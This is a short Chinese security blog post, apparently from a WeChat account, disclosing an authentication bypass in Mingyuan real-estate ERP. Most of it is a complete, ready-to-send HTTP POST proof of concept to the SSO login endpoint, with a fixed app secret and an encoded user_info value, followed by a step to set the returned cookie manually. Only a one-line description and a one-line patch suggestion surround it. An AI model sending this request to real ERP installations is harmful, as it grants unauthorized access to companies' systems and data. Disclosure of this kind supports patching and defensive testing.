#  漏洞验证-明源地产ERP存在身份认证绕过漏洞  
Domren
                    Domren  网安智界   2026-01-28 02:39  
  
一、漏洞描述  
  
明源地产ERP存在身份认证绕过漏洞，攻击者可以访问受保护的资源，执行未授权操作，从而危害系统的安全性和完整性。  
  
二、验证POC  
  
POST /PubPlatform/nav/login/sso/login.aspx HTTP/1.1  
Host: XXXX  
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; rv 11.0) like Gecko  
Accept: */*  
Accept-Encoding: gzip,deflate  
Accept-Language: zh-cn,en-us;q=0.7,en;q=0.3  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 166  
  
__yzsAppSecret=testtest&user_info=%66%79%6d%71%35%62%49%63%78%58%5a%49%78%75%36%4b%6c%6c%73%46%49%52%32%5a%77%45%4a%4b%2b%56%45%39%35%44%6b%78%2f%43%6e%46%67%46%51%3d  
  
   
  
http://XXXX/PubPlatform/Nav/Home/  
  
手动设置cookie  
  
三、验证截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/4GMSIbPibVJ9WH3Z3SThjKYJYrYq5AujE791K99LzBaCxnKUsQWy3UzQmFTWdt4L2MyuEfOCbghgr54Ik84rVyQ/640?wx_fmt=png&from=appmsg "")  
  
四、整改建议  
  
请联系厂商安装补丁或使用防护设备进行拦截。  
  
  
